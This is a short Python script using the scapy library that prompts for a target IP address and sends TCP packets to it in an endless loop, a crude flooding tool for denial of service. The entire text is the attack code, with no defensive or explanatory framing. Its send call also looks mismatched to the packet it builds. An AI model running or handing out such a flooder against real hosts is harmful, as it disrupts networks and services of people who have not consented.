from scapy.all import *
ip = input("insert target ip: ")
pkt=IP(dst=ip)/TCP()
try:
  while True:
     r=sendp(pkt)
except:
   print("\nexit")
